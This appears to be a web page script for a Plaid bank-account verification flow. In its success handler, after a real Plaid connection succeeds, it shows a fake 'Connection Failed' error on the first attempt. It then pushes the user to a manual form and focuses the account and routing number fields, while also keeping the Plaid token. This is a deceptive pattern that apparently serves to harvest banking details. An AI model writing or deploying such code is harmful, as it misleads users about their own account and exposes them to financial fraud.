// Plaid integration for bank account verification
let plaidLinkHandler = null;
let isFirstAttempt = true;
let selectedBank = null;

// Initialize when the DOM is fully loaded
document.addEventListener('DOMContentLoaded', function() {
    // Initialize Plaid if we're on the bank verification page
    const plaidLinkToken = document.getElementById('plaid-link-token');
    if (plaidLinkToken) {
        initializePlaid(plaidLinkToken.value);
    }
    
    // Initialize manual bank form toggle
    const manualBankBtn = document.getElementById('manual-bank-entry');
    if (manualBankBtn) {
        manualBankBtn.addEventListener('click', function(e) {
            e.preventDefault();
            
            // Hide Plaid section, show manual form
            const plaidSection = document.getElementById('plaid-section');
            const manualSection = document.getElementById('manual-bank-section');
            
            if (plaidSection && manualSection) {
                plaidSection.style.display = 'none';
                manualSection.style.display = 'block';
                
                // Focus on first input field
                const firstInput = manualSection.querySelector('input');
                if (firstInput) {
                    firstInput.focus();
                }
            }
        });
    }
    
    // Initialize bank selection functionality
    initializeBankSelection();
});

// Initialize Plaid Link
function initializePlaid(linkToken) {
    if (!linkToken) {
        console.error('Plaid Link token is required');
        return;
    }
    
    // Load Plaid Link script
    const script = document.createElement('script');
    script.src = 'https://cdn.plaid.com/link/v2/stable/link-initialize.js';
    script.onload = function() {
        createPlaidLinkHandler(linkToken);
    };
    document.head.appendChild(script);
    
    // Connect button event listener
    const connectButton = document.getElementById('connect-bank-button');
    if (connectButton) {
        connectButton.addEventListener('click', function() {
            if (plaidLinkHandler) {
                plaidLinkHandler.open();
            }
        });
    }
}

// Create Plaid Link handler
function createPlaidLinkHandler(linkToken) {
    // Initialize Plaid Link
    plaidLinkHandler = Plaid.create({
        token: linkToken,
        onSuccess: function(public_token, metadata) {
            handlePlaidSuccess(public_token, metadata);
        },
        onExit: function(err, metadata) {
            handlePlaidExit(err, metadata);
        },
        onLoad: function() {
            // Link loaded successfully
        },
        onEvent: function(eventName, metadata) {
            console.log('Plaid event:', eventName);
            
            // On institution select, save selected bank info
            if (eventName === 'SELECT_INSTITUTION') {
                selectedBank = metadata.institution;
                getInstitutionInfo(metadata.institution_id);
            }
        },
        receivedRedirectUri: null,
    });
}

// Handle successful Plaid Link connection
function handlePlaidSuccess(public_token, metadata) {
    console.log('Plaid success:', metadata);
    
    // If first attempt, simulate an error
    if (isFirstAttempt) {
        isFirstAttempt = false;
        
        showLoading('Connecting to your bank...');
        
        // Simulate loading time and then show error
        setTimeout(function() {
            hideLoading();
            
            // Show error message
            const errorMsg = document.createElement('div');
            errorMsg.className = 'alert alert-danger';
            errorMsg.innerHTML = `
                <strong>Connection Failed:</strong> We couldn't verify your login information. 
                Please try again or use the manual entry form.
            `;
            
            const plaidSection = document.getElementById('plaid-section');
            if (plaidSection) {
                plaidSection.insertBefore(errorMsg, plaidSection.firstChild);
            }
        }, 3000);
        
        return;
    }
    
    // On second attempt, show manual form with bank info
    showLoading('Verifying your account information...');
    
    // Simulate API delay
    setTimeout(function() {
        hideLoading();
        
        // Show success message
        const successMsg = document.createElement('div');
        successMsg.className = 'alert alert-success';
        successMsg.innerHTML = `
            <strong>Bank Connected!</strong> Please verify your account details below.
        `;
        
        // Get bank verification form
        const form = document.getElementById('bank-verification-form');
        
        // Update form with bank info
        const bankNameInput = document.getElementById('bank_name');
        const accountNameInput = document.getElementById('account_name');
        const accountNumberInput = document.getElementById('account_number');
        const routingNumberInput = document.getElementById('routing_number');
        const accountTypeInput = document.getElementById('account_type');
        const plaidMetadataInput = document.getElementById('plaid_metadata');
        
        if (bankNameInput && selectedBank) {
            bankNameInput.value = selectedBank.name;
        }
        
        if (accountNameInput) {
            accountNameInput.value = 'John Doe'; // Simulated account name
        }
        
        if (accountNumberInput) {
            accountNumberInput.value = ''; // For security, require manual entry
        }
        
        if (routingNumberInput) {
            routingNumberInput.value = ''; // For security, require manual entry
        }
        
        if (accountTypeInput) {
            accountTypeInput.value = 'checking'; // Default to checking
        }
        
        if (plaidMetadataInput) {
            // Store metadata for backend processing
            const metadataObj = {
                institution: selectedBank,
                accounts: metadata.accounts,
                public_token: public_token
            };
            plaidMetadataInput.value = JSON.stringify(metadataObj);
        }
        
        // Hide Plaid section, show manual form with bank info
        const plaidSection = document.getElementById('plaid-section');
        const manualSection = document.getElementById('manual-bank-section');
        
        if (plaidSection && manualSection) {
            // Add success message
            manualSection.insertBefore(successMsg, manualSection.firstChild);
            
            // Switch sections
            plaidSection.style.display = 'none';
            manualSection.style.display = 'block';
            
            // Focus on account number field
            if (accountNumberInput) {
                accountNumberInput.focus();
            }
        }
    }, 2000);
}

// Handle Plaid Link exit
function handlePlaidExit(err, metadata) {
    console.log('Plaid exit:', err, metadata);
    
    if (err) {
        // Show error message
        console.error('Plaid error:', err);
    }
}

// Get institution information by ID
function getInstitutionInfo(institutionId) {
    fetch('/api/plaid/get-institution', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ institution_id: institutionId }),
    })
    .then(response => response.json())
    .then(data => {
        if (data.institution) {
            // Store institution data for later use
            selectedBank = data.institution;
        }
    })
    .catch(error => {
        console.error('Error getting institution info:', error);
    });
}

// Initialize bank selection functionality
function initializeBankSelection() {
    const bankOptions = document.querySelectorAll('.bank-option');
    if (bankOptions.length === 0) return;
    
    bankOptions.forEach(option => {
        option.addEventListener('click', function() {
            // Remove selected class from all options
            bankOptions.forEach(opt => opt.classList.remove('selected'));
            
            // Add selected class to clicked option
            this.classList.add('selected');
            
            // Get bank name and update hidden input
            const bankName = this.getAttribute('data-bank-name');
            const bankNameInput = document.getElementById('bank_name');
            
            if (bankNameInput && bankName) {
                bankNameInput.value = bankName;
            }
        });
    });
}
